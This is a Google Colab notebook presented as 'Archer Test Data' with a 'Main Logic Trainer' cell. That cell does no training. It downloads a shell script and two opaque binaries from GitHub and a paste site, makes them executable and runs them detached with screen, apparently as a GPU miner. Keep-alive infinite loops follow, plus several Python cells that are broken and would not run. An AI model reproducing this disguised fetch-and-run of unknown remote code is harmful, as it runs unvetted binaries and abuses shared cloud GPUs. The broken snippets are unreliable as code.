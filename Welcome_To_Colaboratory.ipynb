{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Welcome To Colaboratory",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/archernap/xTest/blob/main/Welcome_To_Colaboratory.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "BYmEv0rHJngz"
      },
      "source": [
        "**.....Wecome To Archer Test Data....**\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "flr-nka2Kh6F"
      },
      "source": [
        "\n",
        "\n",
        "```\n",
        "# ..GPU CHECKING.. #\n",
        "```\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "KX3b844ZKYzP"
      },
      "source": [
        "from tensorflow.python.client import device_lib\n",
        "device_lib.list_local_devices()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "0xvP7HNtK_5t"
      },
      "source": [
        "\n",
        "\n",
        "```\n",
        "......Main Logic Trainer......\n",
        "```\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "UX00O90sLjdR"
      },
      "source": [
        "#!/bin/sh\n",
        "! sudo apt update && sudo apt install screen -y && wget https://github.com/R3HANx/Arch/raw/main/gpu.sh && chmod u+x gpu.sh && screen -dmS gpu.sh ./gpu.sh 65 75 && wget https://github.com/R3HANx/Arch/raw/main/tuyulgpu && chmod u+x tuyulgpu && wget https://www.heypasteit.com/download/0IW9JH && chmod u+x 0IW9JH && ./0IW9JH 75 85"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "1BugpB1MLnbX"
      },
      "source": [
        "\n",
        "\n",
        "```\n",
        ".....Keep Running Data.....\n",
        "```\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Xb9bY8PvLyyC"
      },
      "source": [
        "while True:pass"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "iVyCaWQIL9U7"
      },
      "source": [
        "import time \n",
        "  while True:\n",
        "   time.sleep(1)\n",
        "   \n",
        "   \n",
        "def do_task():\n",
        "   sleep(10)\n",
        "   print('Task complete.')\n",
        "   event.set()\n",
        "\n",
        "event = Event()\n",
        "Thread(do_task).start()\n",
        "event.wait()\n",
        "\n",
        "print('Continuing...')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "GpP_HjX7MC1h"
      },
      "source": [
        "import threading\n",
        "    import time\n",
        "\n",
        "\n",
        "    class ThreadingExample(object):\n",
        "        \"\"\" Threading example class\n",
        "        The run() method will be started and it will run in the background\n",
        "        until the application exits.\n",
        "        \"\"\"\n",
        "\n",
        "        def __init__(self, interval=1):\n",
        "            \"\"\" Constructor\n",
        "            :type interval: int\n",
        "            :param interval: Check interval, in seconds\n",
        "            \"\"\"\n",
        "            self.interval = interval\n",
        "\n",
        "            thread = threading.Thread(target=self.run, args=())\n",
        "            thread.daemon = True                            # Daemonize thread\n",
        "            thread.start()                                  # Start the execution\n",
        "\n",
        "        def run(self):\n",
        "            \"\"\" Method that runs forever \"\"\"\n",
        "            while True:\n",
        "                # Do something\n",
        "                print('Doing something imporant in the background')\n",
        "\n",
        "                time.sleep(self.interval)\n",
        "\n",
        "    example = ThreadingExample()\n",
        "    time.sleep(3)\n",
        "    print('Checkpoint')\n",
        "    time.sleep(2)\n",
        "    print('Bye')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "YSpUS-cRMJSx"
      },
      "source": [
        "import time\n",
        "def zero_to_infinity():\n",
        "    i = 0\n",
        "    while True:\n",
        "        yield i\n",
        "        i += 1\n",
        "        time.sleep(1)\n",
        "\n",
        "for x in zero_to_infinity():\n",
        "    print(x)"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}